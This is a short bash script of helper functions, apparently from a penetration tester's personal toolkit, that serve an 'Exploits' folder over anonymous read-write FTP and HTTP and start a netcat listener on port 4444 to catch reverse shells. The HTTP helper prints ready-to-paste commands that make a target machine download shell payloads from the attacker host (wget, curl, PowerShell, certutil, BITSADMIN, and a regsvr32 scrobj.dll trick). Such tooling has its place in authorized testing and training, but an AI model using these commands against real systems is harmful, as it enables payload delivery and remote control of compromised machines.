####### ALLOW FTP FILE TRANSFER #######
#######################################  

ftpstart() {
  cd /home/jerry/Exploits || { echo "Exploits dir not found"; cd - > /dev/null; return 1; }
  infostart
  ip=$(get_device_ip)
  [ -z "$ip" ] && { echo "No network IP"; cd - > /dev/null; return 1; }
  
  if [ $# -eq 2 ]; then
    user=$1
    pass=$2
    echo "Starting FTP (anon RW + $user:$pass) on $ip:21..."
    python3 -m pyftpdlib -p 21 -u "$user" -P "$pass" -w
  else
    echo "Starting FTP (anonymous RW, user: test/test) on $ip:21... ftp $ip 21"
    python3 -m pyftpdlib -w  # Pure anon RW (test/test via client if needed)
  fi
  cd - > /dev/null
}

#######################################
####### ALLOW HTTP FILE TRANSFER ####
####################################### 

httpstart() {
  cd /home/jerry/Exploits || { echo "Exploits dir not found"; return 1; }
  port=${1:-80}
  infostart
  ip=$(get_device_ip); [ -z "$ip" ] && { echo "No IP"; cd -; return 1; }
  echo "Python HTTP server: http://$ip:$port"
  echo ""
  echo "=== Linux Commands ==="
  echo "wget http://$ip:$port/shell.sh -O shell.sh"
  echo "curl http://$ip:$port/shell.sh -o shell.sh"
  echo ""
  echo "=== Windows Commands ==="
  echo "powershell -c IWR http://$ip:$port/shell.exe -OutFile shell.exe"
  echo "certutil -urlcache -f http://$ip:$port/shell.exe shell.exe"
  echo ""
  echo "=== Living off the Land ==="
  echo "BITSADMIN /transfer job http://$ip:$port/shell.exe %TEMP%/shell.exe"
  echo "regsvr32 /s /n /u /i:http://$ip:$port/shell.sct scrobj.dll"
  python3 -m http.server $port
  cd -
}

#######################################
####### NETCAT FILE REVERSE SHELL  ####
#######################################  

n4444() {
  cd /home/jerry/Exploits || { echo "Exploits dir not found"; cd - > /dev/null; return 1; }
  infostart
  ip=$(get_device_ip)
  [ -z "$ip" ] && { echo "No network IP"; cd - > /dev/null; return 1; }
  echo "Netcat listener on $ip:4444... nc $ip 4444 < file.txt (or shell)"
  rlwrap nc -lvvnp 4444
  cd - > /dev/null
}

